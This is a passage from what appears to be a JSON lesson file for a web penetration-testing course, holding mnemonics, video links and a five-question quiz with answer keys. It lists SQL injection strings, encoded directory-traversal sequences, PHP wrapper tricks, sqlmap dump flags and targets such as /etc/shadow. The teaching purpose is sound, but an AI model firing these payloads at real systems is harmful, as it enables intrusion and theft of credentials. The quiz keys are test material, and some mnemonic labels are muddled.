      "block_id": "b8c9d0e1-f2a3-4b45-9c0d-1e2f3a4b5c6d",
      "type": "memory_aid",
      "title": "Memory Aids for Web Application Testing",
      "content": {
        "text": "## OWASP Top 10 (2021)\n\n**\"**B**roken **C**rypto **I**njection, then **I**nsecure **S**ecurity **V**ulnerable **I**dentification **S**oftware **S**ecurity **S**SRF\"**\n\n1. **B**roken Access Control\n2. **C**ryptographic Failures\n3. **I**njection\n4. **I**nsecure Design\n5. **S**ecurity Misconfiguration\n6. **V**ulnerable Components\n7. **I**dentification Failures\n8. **S**oftware Integrity Failures\n9. **S**ecurity Logging Failures\n10. **S**SRF\n\nOr just remember: **\"Top 3: BCI\"** (Broken, Crypto, Injection)\n\n## Burp Suite Tools\n\n**\"**P**roxy **R**epeater **I**ntruder **S**canner **D**ecoder\"** = **PRISD** (like \"prised\")\n- **P**roxy (intercept traffic)\n- **R**epeater (manual testing)\n- **I**ntruder (automated attacks)\n- **S**canner (find vulns - Pro only)\n- **D**ecoder (encode/decode)\n\n## SQL Injection Testing\n\n**\"**S**ingle quote, **O**R, **U**NION, **C**omment\"** = **SOUC** (like \"soak\")\n1. **S**ingle quote `'` (test for error)\n2. **O**R `' OR '1'='1` (bypass auth)\n3. **U**NION `' UNION SELECT NULL--` (extract data)\n4. **C**omment `--` or `#` (comment out rest)\n\n## SQL Injection Comments\n\n**\"Hash Dash Slash-Star\"**\n- `#` (MySQL)\n- `--` (MySQL, MSSQL, PostgreSQL) \n- `/**/` (All databases)\n\n## Directory Traversal Sequences\n\n**\"Dot Dot Slash\" variations:\n```\n../           (standard)\n..\\           (Windows)\n....//        (filter bypass)\n%2e%2e%2f     (URL encoded)\n%252e%252e%252f  (double encoded)\n```bash\n\n## Common LFI Targets (Linux)\n\n**\"/etc files\" = PASS, SHADOW, HOSTS\"**\n- `/etc/passwd` (user list)\n- `/etc/shadow` (password hashes)\n- `/etc/hosts` (hostnames)\n\n## PHP File Inclusion Wrappers\n\n**\"**D**ata **F**ilter **Z**ip\"**\n- **D**ata:// (inject code)\n- **F**ilter:// (php://filter - read source)\n- **Z**ip:// (include from ZIP)\n\n## SQLMap Basic Commands\n\n**\"**U**RL **D**atabase **T**able **D**ump\"**\n- `-u` URL\n- `--dbs` (list databases)\n- `--tables` (list tables)\n- `--dump` (extract data)\n\n## Burp Intruder Attack Types\n\n**\"**S**niper **B**attering **P**itchfork **C**luster\"**\n- **S**niper (one position, iterate)\n- **B**attering ram (multiple positions, same payload)\n- **P**itchfork (multiple positions, parallel lists)\n- **C**luster bomb (all combinations)\n\n## Testing Parameters for Injection\n\n**\"**I**D **P**age **F**ile **S**earch\"**\n\nCommon vulnerable parameters:\n- `?id=` (SQL injection)\n- `?page=` (LFI/RFI)\n- `?file=` (directory traversal)\n- `?search=` (SQL injection, XSS)\n\n## SQL Injection to Remember\n\n**\"Always try single quote first\"**\n```\n'           → Error? Vulnerable!\n' OR '1'='1 → Bypass login\n' UNION     → Extract data\n' AND SLEEP(5)-- → Blind SQLi\n```bash\n\n## The Golden Rules\n\n1. **\"Every input is an injection point\"** - Test them all\n2. **\"Use Burp for everything\"** - Don't rely on browser alone\n3. **\"SQLMap when manual fails\"** - Automate the tedious parts\n4. **\"Read the response\"** - Error messages leak information\n5. **\"Document as you test\"** - You'll forget what you tried"
      }
    },
    {
      "block_id": "c9d0e1f2-a3b4-4c56-9d0e-1f2a3b4c5d6e",
      "type": "video",
      "title": "Video Tutorial: Web Application Pentesting",
      "content": {
        "text": "## Recommended Video Resources\n\n**Burp Suite Tutorials**:\n- [Rana Khalil: Burp Suite Tutorial](https://www.youtube.com/c/RanaKhalil101) - Excellent beginner series\n- [IppSec: Using Burp Suite](https://www.youtube.com/results?search_query=ippsec+burp+suite)\n\n**SQL Injection**:\n- [PwnFunction: SQL Injection](https://www.youtube.com/watch?v=2OPVViV-GQk) - Animated explanation\n- [IppSec: SQL Injection Walkthroughs](https://www.youtube.com/results?search_query=ippsec+sql+injection)\n- [HackerSploit: SQLMap Tutorial](https://www.youtube.com/watch?v=nVj8MUKkzQk)\n\n**OWASP Top 10**:\n- [Hackersploit: OWASP Top 10](https://www.youtube.com/playlist?list=PLBf0hzazHTGP8V_wcgMhRHZfJhFj3AsGy) - Full series\n\n**LFI/RFI Attacks**:\n- [IppSec: File Inclusion Attacks](https://www.youtube.com/results?search_query=ippsec+lfi)\n- Real HTB machine walkthroughs\n\n**Web Application Methodology**:\n- [STÖK: Bug Bounty Hunting Methodology](https://www.youtube.com/c/STOKfredrik)\n- [InsiderPhD: Web Security Testing](https://www.youtube.com/c/InsiderPhD)\n\n**Practice Platforms**:\n- **PortSwigger Web Security Academy** (https://portswigger.net/web-security) - FREE interactive labs\n- **OWASP WebGoat** - Vulnerable app for practice\n- **DVWA (Damn Vulnerable Web Application)**\n- **HackTheBox**: Machines with web vulnerabilities\n- **TryHackMe**: OWASP Top 10 room\n\n**Key concepts to watch for**:\n- How Burp proxy intercepts HTTPS\n- Live SQL injection exploitation\n- UNION-based data extraction\n- LFI to RCE techniques\n- Real-world vulnerability discovery\n\n**Pro tip**: Watch IppSec's HackTheBox walkthroughs - he demonstrates professional web pentesting methodology on real machines."
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "q1",
      "type": "multiple_choice",
      "question": "Which OWASP Top 10 vulnerability involves accessing resources or functions that should be restricted to other users?",
      "options": [
        "Injection",
        "Broken Access Control",
        "Security Misconfiguration",
        "Cryptographic Failures"
      ],
      "correct_answer": 1,
      "explanation": "Broken Access Control (OWASP #1) occurs when users can access data or perform actions beyond their intended permissions. This includes IDOR (Insecure Direct Object References), missing function-level access control, and path traversal vulnerabilities.",
      "difficulty": 1
    },
    {
      "question_id": "q2",
      "type": "multiple_choice",
      "question": "In Burp Suite, which tool is best for manually testing a single request with different payloads?",
      "options": [
        "Proxy",
        "Intruder",
        "Repeater",
        "Scanner"
      ],
      "correct_answer": 2,
      "explanation": "Repeater is designed for manual testing - you can modify a request and resend it multiple times, analyzing each response. Intruder is for automated attacks, Proxy is for intercepting traffic, and Scanner is for automated vulnerability detection.",
      "difficulty": 1
    },
    {
      "question_id": "q3",
      "type": "multiple_choice",
      "question": "What is the purpose of the SQL injection payload: ' UNION SELECT NULL,NULL,NULL--",
      "options": [
        "To bypass authentication",
        "To determine the number of columns in the original query",
        "To extract the database version",
        "To delete all records"
      ],
      "correct_answer": 1,
      "explanation": "This payload tests if the query has 3 columns by attempting a UNION with 3 NULL values. If successful, you know the column count and can proceed to extract data. The number of NULLs must match the number of columns in the original query for UNION to work.",
      "difficulty": 2
    },
    {
      "question_id": "q4",
      "type": "multiple_choice",
      "question": "Which directory traversal payload is URL-encoded to bypass basic filters?",
      "options": [
        "../../../etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "..;/..;/etc/passwd"
      ],
      "correct_answer": 1,
      "explanation": "%2e%2e%2f is the URL-encoded version of ../ (%2e = dot, %2f = slash). This can bypass filters that only check for literal ../ strings. Defenders should decode input before validation, and attackers should try encoding to evade filters.",
      "difficulty": 2
    },
    {
      "question_id": "q5",
      "type": "multiple_choice",
      "question": "What PHP wrapper can be used to read source code through an LFI vulnerability?",
      "options": [
        "data://",
        "php://filter",
        "zip://",
        "http://"
      ],
      "correct_answer": 1,
      "explanation": "php://filter with base64 encoding can read PHP source code without executing it. Example: php://filter/convert.base64-encode/resource=index.php returns the base64-encoded source code, which you can then decode to view the original PHP code.",
      "difficulty": 2
    }
  ],
  "mastery_threshold": 80,
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "base_xp_reward": 250,
  "is_core_concept": true,
  "author": "CyberLearn Curriculum Team",
  "version": "1.0"
}